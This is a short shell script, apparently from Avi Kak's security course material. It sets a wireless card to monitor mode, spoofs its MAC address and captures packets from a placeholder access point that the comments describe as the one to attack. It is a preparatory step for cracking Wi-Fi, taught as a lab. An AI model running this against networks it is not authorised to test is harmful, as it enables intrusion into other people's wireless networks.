#!/bin/sh

#  StartMonitorModeInterface.sh
#
#  by Avi Kak (kak@purdue.edu)

#  Run this is a separate window and wait for the last command shown
#  to kick in to start collecting the packets and dumping them in the file
#  specified with the '-w' option.

#  After you have collected sufficient packets, kill the script
#  with ctrl-C.

#  Note that yy is the channel number and xx:xx:xx:xx:xx:xx is the MAC 
#  address of the Access Point you want to attack.

rm -f mydumpfile* replay_arp*
sleep 5
ifconfigOut=`ifconfig mon0 2>&1`
cleanedup="$(echo $ifconfigOut | tr -d ' ')"
if [ `expr $cleanedup : '.*errorfetching.*'` -eq 0 ]
then
    echo killing old Monitor-Mode interface mon0
    airmon-ng stop mon0
fi
sleep 5
echo starting new Monitor-Mode interface mon0
airmon-ng start wlan0
sleep 5
ifconfig mon0 down
sleep 5
macchanger --mac 00:11:22:33:44:55 mon0
sleep 5
ifconfig mon0 up
sleep 5
airodump-ng -c yy -w mydumpfile --bssid xx:xx:xx:xx:xx:xx mon0
